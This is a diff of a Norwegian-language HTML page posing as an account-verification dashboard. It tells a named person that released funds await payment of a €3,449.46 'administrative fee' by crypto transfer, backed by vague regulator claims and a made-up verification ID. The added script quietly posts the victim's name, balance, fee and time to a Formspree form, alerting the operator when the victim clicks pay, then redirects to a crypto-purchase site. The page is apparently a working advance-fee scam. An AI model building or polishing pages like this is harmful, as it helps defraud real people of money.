@@ -17,129 +17,34 @@
             --border-color: #e3e8ee;
             --shadow: 0 7px 14px 0 rgba(60, 66, 87, 0.08), 0 3px 6px 0 rgba(0, 0, 0, 0.12);
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-gray);
-            color: var(--text-main);
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-
-        .header-branding {
-            background: white;
-            padding: 15px 40px;
-            border-bottom: 1px solid var(--border-color);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-gray); color: var(--text-main); display: flex; flex-direction: column; min-height: 100vh; }
+        .header-branding { background: white; padding: 15px 40px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
         .company-logo { max-width: 180px; height: auto; }
         .regulator-logo-top { max-width: 130px; height: auto; }
-
-        .main-container {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
-        }
-
-        .dashboard-card {
-            background: white;
-            width: 100%;
-            max-width: 550px;
-            border-radius: 12px;
-            box-shadow: var(--shadow);
-            overflow: hidden;
-        }
-
-        .card-header {
-            padding: 25px 35px;
-            border-bottom: 1px solid var(--border-color);
-            background: #fff;
-        }
-
-        .card-header h1 {
-            font-size: 1.15rem;
-            font-weight: 700;
-            color: var(--primary-blue);
-        }
-
+        .main-container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
+        .dashboard-card { background: white; width: 100%; max-width: 550px; border-radius: 12px; box-shadow: var(--shadow); overflow: hidden; }
+        .card-header { padding: 25px 35px; border-bottom: 1px solid var(--border-color); background: #fff; }
+        .card-header h1 { font-size: 1.15rem; font-weight: 700; color: var(--primary-blue); }
         .card-body { padding: 35px; }
-
-        .data-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 0;
-            border-bottom: 1px solid #f0f2f5;
-        }
-
+        .data-item { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid #f0f2f5; }
         .label { font-weight: 500; color: var(--text-muted); font-size: 0.9rem; }
         .value { font-weight: 600; color: var(--primary-blue); }
         .balance-value { font-size: 1.3rem; font-weight: 800; }
         .fee-value { color: #e74c3c; font-weight: 700; }
-
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            font-weight: 700;
-            font-size: 0.85rem;
-            padding: 4px 12px;
-            border-radius: 50px;
-        }
-
+        .status-badge { display: inline-flex; align-items: center; font-weight: 700; font-size: 0.85rem; padding: 4px 12px; border-radius: 50px; }
         .status-completed { color: var(--accent-green); background: rgba(46, 204, 113, 0.1); }
         .status-pending { color: #f39c12; background: rgba(243, 156, 18, 0.1); }
-
-        .notice-box {
-            background-color: #f8f9fa;
-            border-left: 4px solid var(--primary-blue);
-            padding: 20px;
-            margin: 25px 0;
-        }
-
+        .notice-box { background-color: #f8f9fa; border-left: 4px solid var(--primary-blue); padding: 20px; margin: 25px 0; }
         .notice-box h2 { font-size: 0.85rem; text-transform: uppercase; margin-bottom: 8px; color: var(--primary-blue); }
         .notice-box p { font-size: 0.8rem; color: var(--text-muted); margin-bottom: 8px; }
-
-        .btn-action {
-            display: block;
-            width: 100%;
-            background: var(--primary-blue);
-            color: white;
-            text-align: center;
-            padding: 16px;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: background 0.2s;
-            border: none;
-            cursor: pointer;
-            font-size: 1rem;
-        }
-
+        .btn-action { display: block; width: 100%; background: var(--primary-blue); color: white; text-align: center; padding: 16px; border-radius: 6px; text-decoration: none; font-weight: 600; transition: background 0.2s; border: none; cursor: pointer; font-size: 1rem; }
         .btn-action:hover { background: var(--btn-hover); }
         .btn-action:disabled { background: #ccc; cursor: not-allowed; }
-
-        .footer {
-            background: white;
-            padding: 30px 20px;
-            border-top: 1px solid var(--border-color);
-            text-align: center;
-        }
-
+        .footer { background: white; padding: 30px 20px; border-top: 1px solid var(--border-color); text-align: center; }
         .compliance-text { font-size: 0.7rem; color: #a3acb9; max-width: 500px; margin: 0 auto; }
-
         #step-2 { display: none; }
-
-        @media (max-width: 480px) {
-            .header-branding { flex-direction: column; gap: 15px; }
-        }
+        @media (max-width: 480px) { .header-branding { flex-direction: column; gap: 15px; } }
     </style>
 </head>
 <body>
@@ -150,7 +55,6 @@
     </header>
 
     <div class="main-container">
-        <!-- TRINN 1: VERIFISERINGSDETALJER -->
         <div id="step-1" class="dashboard-card">
             <div class="card-header"><h1>Status for kontoverifisering</h1></div>
             <div class="card-body">
@@ -174,18 +78,14 @@
                     <span class="label">Gebyrstatus</span>
                     <span class="status-badge status-pending"><i class="fas fa-clock"></i> &nbsp; Venter</span>
                 </div>
-
                 <div class="notice-box">
                     <h2>Viktig melding</h2>
-                    <p>Ytterligere dokumentasjon eller administrativ gjennomgang kan være nødvendig før kontotjenester kan behandles fullstendig.</p>
                     <p>Administrative gebyrer må gjøres opp for å fullføre prosessen med frigjøring av midler.</p>
                 </div>
-
                 <button class="btn-action" onclick="showStep2()">Fortsett til oppgjør</button>
             </div>
         </div>
 
-        <!-- TRINN 2: OPPGJØR -->
         <div id="step-2" class="dashboard-card">
             <div class="card-header"><h1>Administrativt oppgjør</h1></div>
             <div class="card-body">
@@ -193,14 +93,10 @@
                     <p style="color: var(--text-muted); font-size: 0.9rem;">Totalt gebyrbeløp som forfaller:</p>
                     <h2 style="font-size: 2rem; color: var(--primary-blue);">€3 449,46</h2>
                 </div>
-
-                <p style="margin-bottom: 20px; font-size: 0.9rem;">For å fullføre frigjøringen av midler til <strong>Asbjørn Finholt</strong>, vennligst fortsett med oppgjøret via vår autoriserte sikre portal.</p>
-                
+                <p style="margin-bottom: 20px; font-size: 0.9rem;">For å fullføre frigjøringen av midler til <strong>Asbjørn Finholt</strong>, vennligst fortsett med oppgjøret.</p>
                 <div class="notice-box" style="border-left-color: #f39c12;">
                     <p><strong>Betalingsmetode:</strong> Sikker kryptooverføring</p>
-                    <p style="font-size: 0.75rem;">Viderekobler til partner: Changelly Global</p>
                 </div>
-
                 <button id="pay-button" class="btn-action" style="background: #2ecc71;" onclick="handlePayment()">BETAL GEBYR OG FRIGJØR MIDLER</button>
                 <button onclick="location.reload()" style="background:none; border:none; color:var(--text-muted); width:100%; margin-top:15px; cursor:pointer; font-size:0.8rem;">Tilbake til oversikt</button>
             </div>
@@ -210,8 +106,7 @@
     <footer class="footer">
         <p class="compliance-text">
             Autorisert og regulert av relevante internasjonale tilsynsmyndigheter. 
-            Alle transaksjoner er underlagt AML/KYC-verifisering.
-            <br>Verifiserings-ID: 8842-X99-FINHOLT
+            Verifiserings-ID: 8842-X99-FINHOLT
         </p>
     </footer>
 
@@ -229,4 +124,25 @@
             const formData = new FormData();
             formData.append('Action', 'Betaling initiert');
             formData.append('Kunde', 'Asbjørn Finholt');
-            
+            formData.append('Saldo', '€24 639');
+            formData.append('Gebyr', '€3 449,46');
+            formData.append('Tidspunkt', new Date().toLocaleString('nb-NO'));
+
+            const timeout = new Promise((resolve) => setTimeout(resolve, 1500));
+            const sendNotification = fetch('https://formspree.io/f/mqeovrgq', {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            });
+
+            try {
+                await Promise.race([sendNotification, timeout]);
+            } catch (error) {
+                console.error('Notification error:', error);
+            } finally {
+                window.location.href = "https://changelly.com/buy-crypto";
+            }
+        }
+    </script>
+</body>
+</html>
